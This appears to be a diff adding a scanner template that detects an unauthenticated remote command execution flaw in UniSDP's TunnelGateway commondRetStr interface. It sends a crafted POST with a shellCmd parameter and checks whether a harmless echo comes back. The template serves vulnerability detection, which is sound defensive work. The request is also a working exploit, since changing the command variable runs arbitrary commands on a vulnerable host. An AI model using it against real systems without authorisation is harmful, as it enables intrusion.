@@ -1,0 +1,30 @@
+id: unisdp-unauth-commandretstr-rce
+info:
+  name: UniSDP Unauth commondRetSt RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The UniSDP software-defined boundary system has a vulnerability in the TunnelGateway's commondRetStr interface. This allows unauthenticated attackers to execute remote commands by sending specially crafted requests.
+  tags: rce
+
+variables:
+  cmd: "echo justfottest"
+
+http:
+  - raw:
+      - |
+        POST /TunnelGateway/commondRetStr HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        shellCmd={{cmd}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "justfottest"
+          - "\"msg\":\"success\""
+        part: body
